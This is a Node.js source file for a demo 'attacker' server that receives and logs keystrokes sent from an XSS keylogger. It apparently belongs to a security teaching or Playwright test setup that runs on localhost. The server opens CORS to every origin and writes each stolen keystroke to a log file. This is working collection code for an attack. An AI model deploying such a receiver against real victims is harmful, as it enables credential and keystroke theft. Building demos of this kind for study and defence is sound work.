// Standalone "attacker" server used to demonstrate the XSS keylogger.
// It is intentionally NOT part of the app backend: it runs as its own Node
// process, on its own port, and only knows how to append whatever it receives
// to a log file. The whole point of XSS is that the victim's browser is what
// talks to this server, not our trusted backend.
const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.ATTACKER_PORT || 4000;
const LOG_FILE = path.join(__dirname, 'keylog.txt');

const server = http.createServer((req, res) => {
  // Without CORS the victim's browser would block the cross-origin POST coming
  // from the React app (origin :3000) to this server (:4000). The keylogger
  // would look broken when it is actually being stopped by the browser.
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  if (req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => {
      body += chunk;
    });
    req.on('end', () => {
      // One stolen keystroke per line, with a timestamp so the log is readable.
      const line = `${new Date().toISOString()} ${body}\n`;
      fs.appendFile(LOG_FILE, line, (err) => {
        if (err) {
          res.writeHead(500);
          res.end('error');
          return;
        }
        res.writeHead(200);
        res.end('ok');
      });
    });
    return;
  }

  // Any other method (e.g. the readiness GET that Playwright's webServer makes)
  // just gets a friendly 200 so callers know the server is up.
  res.writeHead(200);
  res.end('attacker server up');
});

server.listen(PORT, () => {
  console.log(`Attacker server listening on http://localhost:${PORT}`);
});
